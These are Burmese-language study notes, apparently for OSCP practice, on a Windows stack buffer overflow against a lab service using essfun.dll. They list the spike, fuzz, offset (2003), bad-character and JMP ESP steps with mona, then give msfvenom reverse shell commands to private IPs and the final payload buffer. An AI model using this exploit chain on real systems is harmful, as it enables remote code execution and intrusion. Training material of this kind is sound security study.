!mona config -set workingfolder c:\mona\%p နဲ့ mona ကို config ချထားမယ်

အရင် spike လုပ်ရမယ်လုပ်ဖို့က

generic_send_tcp ကိုသုံးတယ် Usage=>
generic_send_tcp 192.168.x.x 4444 something.spk 0 0

spike လုပ်တာက ဘယ် function ကပေါက်နေလဲ buffer space ကို overflow ဖြစ်သွားလဲဆိုတာကို စစ်တာ

spike လုပ်ပြီးရင်တော့ fuzz လုပ်ပြီး ဘယ် bytes မှာ crash ဖြစ်လဲဆိုတာကိုရှာမယ်

fuzz လုပ်တော့ 2800 bytes မှာ crash ဖြစ်သွားတယ် အဲ့တာဆို offset ရှာမယ်
bytes 3000 လောက်နဲ့ pattern တစ်ခုဆောက်မယ်
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 ဆိုပြီးဆောက်မယ်

eip က 386F4337 လို့တွေ့တယ်
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337 နဲ့ရှာလိုက်တယ်

အဲ့ကောင်ရဲ့ location ကိုရှာတော့ 2003 မှာတွေ့တယ်

ပြီးရင် A * 2003 + "B" * 4 နဲ့ eip ကို ရောက်လားစစ်တယ်
!mona bytearray -b "\x00" ဆိုပြီး ဖြစ်နို်ငတဲ့ badchars တွေကို mona နဲ့ထုတ်ထားမယ်
ရောက်တာသေချာတော့ A * 2003 + "B" * 4 + badchars နဲစစ်တယ်
!mona compare -f C:\mona\oscp\bytearray.bin -a esp နဲ့ badchars တွေကျလာလိမ့်မယ် ဒီကောင်တွေက normal badchars တွေ အဲ့ကောင်တွေထဲကနေ mona badchars တွေကိုရှာရမယ်


ပြီးရင် immunity debugger မှာ !mona modules နဲ့ flase ဖြစ်တဲ့ကောင်ကိုရှာပြီးရင်
!mona find -s "\xff\xe4" -m essfun.dll
ffe4 က nasm_shell ကနေရတယ် nasm_shell မှာ JMP ESP လို့ရိုက်လိုက်ရင်ထွက်တာ

အဲ့ကနေ return address တွေရလာတယ်
အပေါ်ဆုံးကကောင်က 62511af အဲ့ကောင်ကို သုံးမယ်

အရင် immunity debugger ကနေ 625011af ကိုရှာပြီး break point ထားတယ် (press F2 to set breakpoint)

ပြီးရင် run ကြည့်တယ် breakpoint မှာ program ကရပ်နေတယ်
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.14 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
-f c က c file အနေနဲ့ထုတ်တာ -b မှာက bad chars တွေထည့်ရမှာ
exploit မှာ ခုနက ရလာတဲ့ shell code ကိုထည့်မယ် ပြီးရင်
buffer = "A" * 2003 + ("\xaf\x11\x50\x62") + exploit

ဒီနေရာမှာဖြစ်သွားမှာ A တွေနဲ့ buffer space ကပြည့်သွားမယ်ပြီးရင် JMP ESP ဆိုတော့ instruction pointer ကတခြားတစ်နေရာကိုခုံသွားမယ် ခုန်သွားရင် ရှိနေမယ့် instruction က ခုနကထည့်ပေးလိုက်တဲ့ shell code ဖြစ်နေတော့မယ်၊ ဒါပေမယ့် padding နည်းနည်းတော့ခံပေးရတယ်။ ဆိုတော့ final payload က ဒီလိုဖြစ်နေမယ်

padding = ("\x90" * 32)
buffer = "A" * 2003 + ("\xaf\x11\x50\x62") + padding + exploit

nc နဲ့ listen နေမယ်ပြီးရင် exploit ကို run လိုက်မယ် ဒါဆို success ပြီ




msfvenom -p windows/shell_reverse_tcp LHOST=10.8.168.151 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x2e\x2f\xa0\xa1"
